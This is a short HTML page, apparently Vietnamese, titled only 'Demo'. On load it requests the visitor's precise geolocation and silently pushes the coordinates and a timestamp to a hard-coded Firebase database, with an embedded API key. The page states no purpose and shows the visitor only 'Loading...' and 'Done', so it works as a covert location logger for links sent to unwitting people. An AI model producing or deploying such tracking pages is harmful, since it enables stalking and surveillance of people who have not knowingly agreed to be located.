<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Demo</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        text-align: center;
        padding: 20px;
      }
      #status {
        margin-top: 20px;
        font-weight: bold;
        color: green;
      }
    </style>
  </head>
  <body>
    <h2>Demo</h2>
    <p id="status">Loading...</p>

    <script type="module">
      // Import Firebase SDKs
      import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js";
      import {
        getDatabase,
        ref,
        push,
      } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-database.js";

      // Cấu hình Firebase
      const firebaseConfig = {
        apiKey: "AIzaSyDOgeNEwXDmqNgO1B2eNXvmV0IprvMj4sg",
        authDomain: "fir-cf37b.firebaseapp.com",
        databaseURL: "https://fir-cf37b-default-rtdb.firebaseio.com",
        projectId: "fir-cf37b",
        storageBucket: "fir-cf37b.firebasestorage.app",
        messagingSenderId: "633119732768",
        appId: "1:633119732768:web:4d55eb1f2a225a44107845",
      };

      const app = initializeApp(firebaseConfig);
      const database = getDatabase(app);

      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(saveLocation, showError, {
            enableHighAccuracy: true,
          });
        } else {
          document.getElementById("status").innerText =
            "Trình duyệt không hỗ trợ định vị.";
        }
      }

      function saveLocation(position) {
        let latitude = position.coords.latitude;
        let longitude = position.coords.longitude;
        let accuracy = position.coords.accuracy;
        let timestamp = new Date().toISOString();

        let locationData = {
          latitude: latitude,
          longitude: longitude,
          accuracy: accuracy,
          timestamp: timestamp,
        };

        push(ref(database, "locations"), locationData)
          .then(() => {
            document.getElementById("status").innerText = "Done";
          })
          .catch((error) => {
            document.getElementById("status").innerText = "Error";
            console.error("Firebase Error:", error);
          });
      }

      function showError(error) {
        let msg = "";
        switch (error.code) {
          case error.PERMISSION_DENIED:
            msg = "error 1";
            break;
          case error.POSITION_UNAVAILABLE:
            msg = "error 2";
            break;
          case error.TIMEOUT:
            msg = "timeout";
            break;
          default:
            msg = "unknow error";
        }
        document.getElementById("status").innerText = msg;
      }

      window.onload = getLocation;
    </script>
  </body>
</html>
